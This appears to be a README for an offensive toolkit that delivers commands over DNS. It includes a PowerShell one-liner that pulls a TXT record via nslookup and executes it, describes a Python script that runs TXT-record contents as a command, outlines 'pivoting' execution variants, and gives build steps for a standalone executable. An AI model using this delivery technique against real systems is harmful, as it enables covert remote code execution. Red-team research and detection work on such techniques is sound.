## DNS-Server.cs ##
- Install-Package ARSoft.Tools.Net (NuGet)
- Execute: "powershell . (nslookup -q=txt example.com 127.0.0.1)[-1]"
  The locahohost IP has to be given to differentiate between the "real" domain and the locally running one.

-- Build an executable from the Developer Console within Visual studio

https://learn.microsoft.com/en-us/dotnet/core/deploying/single-file/overview?tabs=cli
- Build:
  <code>
  C:\Users\Noone\Desktop\app\ConsoleApp2>dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:PublishReadyToRun=true -p:PublishTrimmed=true -p:PublishDir=.\publish --force
  </code>
- Build standalone:
  <code>
  dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:PublishReadyToRun=true -p:PublishTrimmed=true -p:IncludeNativeLibrariesForSelfExtract=true -p:PublishDir=.\publish --force
  </code>

## nshookup.py (needs dnspython) ##
- nshookup.py:\
  Python implemetation of nslookup. Only works with one TXT entry.
  Gets the entry and executes the content between the two "" as command.
  Command: python nshookup.py domain.com

- nshookup_1.py:\
  Hardcoded domain:
  Command: python nshookup.py

## pivoting.cs ##
- pivoting_1.cs:\
  No checks, just go for it
- pivoting_2.cs:\
  Checks if at least a part of a certain string is present before executing the first step
- pivoting_3.cs:\
  Defines the string as mandatory to execute the first step
